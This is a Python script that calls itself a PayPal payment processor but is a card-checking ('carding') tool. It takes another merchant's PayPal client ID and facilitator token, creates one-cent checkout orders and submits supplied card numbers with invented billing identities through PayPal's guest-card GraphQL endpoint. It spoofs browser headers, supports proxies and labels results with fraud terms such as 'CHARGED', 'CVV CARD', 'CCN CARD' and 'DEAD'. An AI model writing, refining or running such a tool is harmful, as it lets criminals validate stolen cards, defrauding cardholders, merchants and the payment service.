import requests
from uuid import uuid4
from typing import Dict, Optional, Any
import json
import warnings

# Suppress SSL warnings for now
warnings.filterwarnings('ignore', message='Unverified HTTPS request')


class CurlHandler:
    """Handles HTTP requests with proxy support"""
    
    def __init__(self):
        self.cookies = {}
        self.session = requests.Session()
        self.session.verify = True  # Enable SSL verification
    
    def get(self, url: str, headers: Optional[Dict] = None, cookie: Optional[str] = None, proxy: Optional[str] = None) -> Dict[str, Any]:
        """Make GET request"""
        try:
            default_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://www.paypal.com/",
                "Origin": "https://www.paypal.com"
            }
            if headers:
                default_headers.update(headers)
            
            proxies = {"http": proxy, "https": proxy} if proxy else None
            response = self.session.get(url, headers=default_headers, proxies=proxies, timeout=10)
            
            success = response.status_code in (200, 201, 202)
            if not success:
                print(f"[GET] Status: {response.status_code}")
                print(f"[GET] Response (first 500 chars): {response.text[:500]}")
            
            return {
                "success": success,
                "body": response.text,
                "status": response.status_code
            }
        except Exception as e:
            print(f"[GET Exception] {type(e).__name__}: {e}")
            return {"success": False, "body": str(e), "status": None}
    
    def post(self, url: str, data: str, headers: Optional[Dict] = None, cookie: Optional[str] = None, proxy: Optional[str] = None) -> Dict[str, Any]:
        """Make POST request"""
        try:
            default_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://www.paypal.com/",
                "Origin": "https://www.paypal.com"
            }
            if headers:
                default_headers.update(headers)
            
            proxies = {"http": proxy, "https": proxy} if proxy else None
            response = self.session.post(url, data=data, headers=default_headers, proxies=proxies, timeout=10)
            
            success = response.status_code in (200, 201, 202)
            if not success:
                print(f"[POST] URL: {url}")
                print(f"[POST] Status: {response.status_code}")
                print(f"[POST] Response (first 500 chars): {response.text[:500]}")
            
            return {
                "success": success,
                "body": response.text,
                "status": response.status_code
            }
        except Exception as e:
            print(f"[POST Exception] {type(e).__name__}: {e}")
            return {"success": False, "body": str(e), "status": None}
    
    def delete_cookie(self):
        """Clear cookies"""
        self.cookies = {}


class Tools:
    """Utility functions for data generation"""
    
    @staticmethod
    def get_user():
        """Generate fake user data"""
        return type('User', (), {
            'first': 'John',
            'last': 'Doe',
            'email': 'john.doe@example.com'
        })()


class PayPalProcessor:
    """Main PayPal payment processor"""
    
    def __init__(self):
        self.curlx = CurlHandler()
        self.tools = Tools()
    
    @staticmethod
    def proxy() -> Dict[str, Optional[str]]:
        """Get proxy server configuration"""
        return {"proxy": None}
    
    @staticmethod
    def getstr(text: str, start: str, end: str) -> str:
        """Extract string between delimiters"""
        try:
            start_idx = text.find(start)
            if start_idx == -1:
                return ""
            start_idx += len(start)
            end_idx = text.find(end, start_idx)
            if end_idx == -1:
                return ""
            return text[start_idx:end_idx]
        except Exception:
            return ""
    
    def process_payment(self, cc: str, mm: str, yyyy: str, cvv: str) -> Dict[str, str]:
        """Process payment through PayPal"""
        retry = 0
        is_retry = False
        empty_error = None
        status = None
        
        max_retries = 3
        
        while retry <= max_retries:
            # Retry logic
            if is_retry:
                retry += 1
                self.curlx.delete_cookie()
            
            if retry > 2:
                if not empty_error:
                    empty_error = "Maximum Retrys Reached"
                status = {
                    'emoji': '❌',
                    'status': 'DECLINED',
                    'msg': f"RETRY - {empty_error}!"
                }
                break
            
            is_retry = True
            print(f"\n[Attempt {retry + 1}]")
            
            server = self.proxy()
            fake = self.tools.get_user()
            cookie = str(uuid4())
            
            # First request - Get facilitator token
            url1 = 'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&components.0=buttons&locale.country=US&locale.lang=en&clientID=AQZEoTLIsBr8cwqlNpUubKhXRm6qFxWOUi-fzJsb-kWai3KV4_ewR8HkSGyKEjG7h2yo1kyxuIjt3KO2&currency=USD'
            print(f"[Step 1] Requesting facilitator token...")
            r1 = self.curlx.get(url1, cookie=cookie, proxy=server['proxy'])
            
            if not r1['success']:
                print(f"[Step 1] Failed")
                empty_error = 'First Request Failed'
                continue
            
            bearer = self.getstr(r1['body'], 'facilitatorAccessToken":"', '"')
            
            if not bearer:
                empty_error = 'First Request Token is Empty'
                print(f"[Step 1] Token not found in response")
                continue
            
            print(f"[Step 1] Bearer token obtained: {bearer[:20]}...")
            
            # Second request - Create checkout order
            data = '{"purchase_units":[{"amount":{"value":"0.01","currency_code":"USD"},"description":"Love"}],"intent":"CAPTURE","application_context":{}}'
            headers = {
                "content-type": "application/json",
                "Authorization": f"Bearer {bearer}"
            }
            
            print(f"[Step 2] Creating checkout order...")
            r2 = self.curlx.post('https://www.paypal.com/v2/checkout/orders', data, headers, cookie, server['proxy'])
            
            if not r2['success']:
                print(f"[Step 2] Failed")
                empty_error = 'Second Request Failed'
                continue
            
            order_id = self.getstr(r2['body'], '"id":"', '"')
            
            if not order_id:
                empty_error = 'Second Request Token is Empty'
                print(f"[Step 2] Order ID not found in response")
                continue
            
            print(f"[Step 2] Order ID obtained: {order_id[:20]}...")
            
            # Third request - Approve payment with card
            mutation_data = {
                "query": "mutation payWithCard($token: String! $card: CardInput! $phoneNumber: String $firstName: String $lastName: String $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType $installmentTerm: Int) { approveGuestPaymentWithCreditCard(token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } }",
                "variables": {
                    "token": order_id,
                    "card": {
                        "cardNumber": cc,
                        "expirationDate": f"{mm}/{yyyy}",
                        "postalCode": "11215",
                        "securityCode": cvv
                    },
                    "phoneNumber": "2453759468",
                    "firstName": fake.first,
                    "lastName": fake.last,
                    "billingAddress": {
                        "givenName": fake.first,
                        "familyName": fake.last,
                        "line1": "388 7th Street",
                        "line2": None,
                        "city": "Brooklyn",
                        "state": "NY",
                        "postalCode": "11215",
                        "country": "US"
                    },
                    "shippingAddress": {
                        "givenName": fake.first,
                        "familyName": fake.last,
                        "line1": "388 7th Street",
                        "line2": None,
                        "city": "Brooklyn",
                        "state": "NY",
                        "postalCode": "11215",
                        "country": "US"
                    },
                    "email": fake.email,
                    "currencyConversionType": "VENDOR"
                },
                "operationName": None
            }
            
            headers = {
                "content-type": "application/json",
                "paypal-client-context": order_id,
                "paypal-client-metadata-id": order_id,
                "x-app-name": "standardcardfields",
                "x-country": "US"
            }
            
            print(f"[Step 3] Processing payment...")
            r3 = self.curlx.post(
                'https://www.paypal.com/graphql?fetch_credit_form_submit',
                json.dumps(mutation_data),
                headers,
                cookie,
                server['proxy']
            )
            
            if not r3['success']:
                print(f"[Step 3] Failed")
                continue
            
            # Parse response
            code = self.getstr(r3['body'], 'state":"', '"')
            if not code:
                code = self.getstr(r3['body'], 'code":"', '"')
            if not code:
                code = self.getstr(r3['body'], 'message":"', '"')
            
            err_msg = code.replace('_', ' ') if code else ''
            
            # Determine status based on response
            if 'parentType":"Auth' in r3['body'] or '"NON_PAYABLE"' in r3['body']:
                status = {
                    'status': 'APPROVED',
                    'emoji': '✅',
                    'msg': 'CHARGED - Payment Successfully!'
                }
            elif 'INVALID_BILLING_ADDRESS' in r3['body']:
                status = {
                    'status': 'APPROVED',
                    'emoji': '✅',
                    'msg': f"AVS FAILED - {err_msg}!"
                }
            elif 'EXISTING_ACCOUNT_RESTRICTED' in r3['body']:
                status = {
                    'status': 'APPROVED',
                    'emoji': '✅',
                    'msg': f"CVV CARD - {err_msg}!"
                }
            elif 'INVALID_SECURITY_CODE' in r3['body']:
                status = {
                    'status': 'APPROVED',
                    'emoji': '✅',
                    'msg': f"CCN CARD - {err_msg}!"
                }
            else:
                status = {
                    'status': 'DECLINED',
                    'emoji': '❌',
                    'msg': f"DEAD - {err_msg if code else 'Unknown Error'}!"
                }
            
            print(f"[Step 3] Result: {status['msg']}")
            break
        
        return status


if __name__ == "__main__":
    processor = PayPalProcessor()
    
    # Example usage (with test data)
    result = processor.process_payment(
        cc="4021700137607265",
        mm="10",
        yyyy="2029",
        cvv="009"
    )
    
    print("\n" + "="*50)
    print(json.dumps(result, indent=2))
